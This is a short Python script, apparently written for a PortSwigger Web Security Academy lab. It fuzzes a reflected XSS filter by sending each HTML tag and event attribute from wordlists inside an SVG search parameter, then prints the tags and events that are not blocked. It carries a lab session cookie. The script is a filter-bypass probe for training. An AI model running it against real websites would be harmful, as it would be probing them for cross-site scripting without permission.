import requests

burp0_url = "https://0a8c008903910a7c82731bf100b500ec.h1-web-security-academy.net:443/?search=<svg></svg>"
burp0_cookies = {"session": "L6kZAKQTGQ1QlVPtrBEMRn1Qi4BkFMR6"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://0a8c008903910a7c82731bf100b500ec.h1-web-security-academy.net/?search=%3Csvg%3E", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers", "Connection": "keep-alive"}
requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

html_tag = open('/home/kali/html_tags', 'r')
html_events = open('/home/kali/html_events', 'r')

for tag in html_tag:
    burp0_url = "https://0a8c008903910a7c82731bf100b500ec.h1-web-security-academy.net:443/?search=<svg><{}></svg>".format(tag)
    response = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    print(burp0_url)

    if ('Tag is not allowed') in response.text:
        continue
    else:
        print('allowed tag is' + tag)

        for event in html_events:
            burp0_url = f"https://0a8c008903910a7c82731bf100b500ec.h1-web-security-academy.net:443/?search=<svg><{tag}+{event}=1></svg>"
            response = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
            print(burp0_url)

            if ('Event is not allowed') in response.text:
                continue
            else:
                print(f'allowed attribute for this tag {tag} is' + event)

html_tag.close()
html_events.close()